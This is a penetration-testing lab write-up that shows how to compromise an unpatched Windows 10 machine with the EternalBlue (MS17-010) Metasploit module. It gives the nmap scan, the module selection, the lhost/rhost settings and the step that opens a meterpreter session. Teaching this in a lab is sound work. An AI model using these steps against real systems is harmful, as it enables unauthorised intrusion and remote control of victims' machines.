# Windows-10 Eternal Blue Exploit #
Eternal blue exploit is critical vulnerability for microsoft windows operating system, but this vulnerability is patched with security updates by microsoft. In this  lab we will demostrate windows 10 eternal blue exploit.

## Prerequstite for this lab ##
- Windows 10
- Kali-linux
- [Nmap](https://www.nmap.org)
- [Metasploit Framework](https://www.metasploit.com)

## Lab Configuration  ##
- ping between windows 10 and kali-linux
- make sure hosts  are in same network

<p align="center"><img src="https://github.com/w3buildpractices/Ethical-Hacking/assets/154745254/3fe162f6-d5c2-4982-9257-fa5959fc840b" width="450px" height="300px"><br>Figure(1) IP Check</p>
<p align="center"><img src="https://github.com/w3buildpractices/Ethical-Hacking/assets/154745254/66da9af4-0ab9-4c91-aa1a-b764511b61e1" width="450px" height="300px"><br>Figure(2) Ping Between hosts</p>

### Step-1 ###
start scan target machine by using nmap to check whether port 445 is open. In kali-linux terminal type ``` nmap -sS -sV -Pn [Target IP] ```. And then press enter.
```
- nmap is command to run nmap program
- sS is option to stealth scan type
- sV is option to set version detect scan type
- Pn flag is to skip ping option
- [target IP] is our target IP
```
<p align="center"><img src="https://github.com/w3buildpractices/Ethical-Hacking/assets/154745254/2e679af3-3678-4660-8252-3a948bf51074" width="450px" height="300px"><br>Figure(3) Nmap Scan results</p>

### Step-2 ###
We will use Metasploit to lunch eternal blue exploit. In kali-linux terminal type ``` msfconsole ``` to use Metasploit.
<p align="center"><img src="https://github.com/w3buildpractices/Ethical-Hacking/assets/154745254/48f589ff-55bf-406d-920c-5cc9e71ab4a6" width="450px" height="300px"><br>Figure(4)  Metasploit Console</p>

After entering metasploit console. we will search for eternal blue exploit. In metasploit console type ```  search ms17 ```. MS17-010 is code for windows 10 eternal blue exploit.

<p align="center"><img src="https://github.com/w3buildpractices/Ethical-Hacking/assets/154745254/479e492e-4614-4945-8316-79b0b5f50220" width="450px" height="300px"><br>Figure(5) Metasploit Results</p>

To interact with exploit module, In metasploit terminal type ``` use 1 ``` to use exploit.
<p align="center"><img src="https://github.com/w3buildpractices/Ethical-Hacking/assets/154745254/99a78f2b-7c37-4a25-9330-7918cfe3d4e4" width="450px" height="300px"><br>Figure(6) Module is selected </p>

<p align="center"><img src="https://github.com/w3buildpractices/Ethical-Hacking/assets/154745254/9ba2bbd0-3808-4e2d-9d4e-b33b62528f42" width="450px" height="300px"><br>Figure(7)</p>

After module is selected we need to provide some information for exploit. To know what type of information is required just type ``` show options ``` to see information. 
```
- set lhost [Attacker IP]
- set target [2]
- set rhost [Target IP]
```
<p align="center"><img src="https://github.com/w3buildpractices/Ethical-Hacking/assets/154745254/13d92e36-28c7-4f34-8450-38182945362e" width="450px" height="300px"><br>Figure(8) Options </p>

After required options are set. To start attack just type ```exploit```.
<p align="center"><img src="https://github.com/w3buildpractices/Ethical-Hacking/assets/154745254/5600ed51-5314-4933-a8a2-cde6dbe63310" width="450px" height="300px"><br>Figure(9) Exploit completed</p>

Exploit is completed and meterpreter session is open. Type ``` sysinfo ``` command to see system information.
<p align="center"><img src="https://github.com/w3buildpractices/Ethical-Hacking/assets/154745254/b0f8bdf9-14b2-482b-b962-168c63244ae7" width="450px" height="300px"><br>Figure(10) System Information</p>
